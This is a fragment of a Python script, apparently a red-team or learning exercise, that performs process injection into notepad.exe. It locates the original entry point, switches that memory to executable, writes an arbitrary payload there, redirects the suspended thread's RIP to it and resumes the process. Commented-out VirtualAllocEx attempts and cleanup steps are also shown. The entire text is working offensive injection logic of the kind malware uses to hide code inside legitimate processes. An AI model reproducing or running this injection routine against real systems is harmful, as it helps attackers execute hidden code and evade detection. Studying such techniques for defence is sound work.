#hollow_process(hProcess, img_base_addr)

# retrieve SizeOfImage for payload
# size_of_image = get_sizeof_image(payload)



# ----------------------------------
# Allocate memory, and write payload
# ----------------------------------

# allocate memory (RW) <- ptr to base address of memory
# - given wrapper, if we can't re-assign img_base_addr, a winerr() is raised
# lpBaseAddress = virtual_alloc_ex(hProcess, img_base_addr, size_of_image)
# lpBaseAddress = virtual_alloc_ex(hProcess, img_base_addr, len(payload))



# Workaround - because of 0xc0000005 Access Violation issues
# instead of point Rip to the start of the file (img_base_addr), point it to the Original Entry Point (oep)

oep_rva = get_entry_point_rva(r"c:\windows\system32\notepad.exe")
original_entry_point = img_base_addr + oep_rva

print(f"\n[+] Re-using existing Entry Point at: {hex(original_entry_point)}")
print(f"    -> image_base_address + oep_rva")

# modify memory protection setting (RW -> RX)
#old_mem_protect = modify_memory_protection(hProcess, lpBaseAddress, size_of_image)
old_mem_protect = modify_memory_protection(hProcess, original_entry_point, len(payload))


# write payload into allocated memory
write_payload(hProcess, original_entry_point, payload)





# confirm execution of payload
pause(warning=True)

# change RIP
redirect_to_payload(hThread, original_entry_point, payload)

# resume execution of original thread/process
resume_orig_process(hThread, dwThreadId, dwProcessId)


# ----------------------------------
# Clean-up
# ----------------------------------
hdr = "\n>>>>    Cleaning up    <<<<\n"
print("\n" + "-" *len(hdr) + hdr + "-" *len(hdr))

# reset memory protection setting (RX -> RW)
# print(f"[!] Resetting back to previous Memory Protection setting...")
# modify_memory_protection(hProcess, lpBaseAddress, len(payload), old_mem_protect)



# close all handles
print()
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
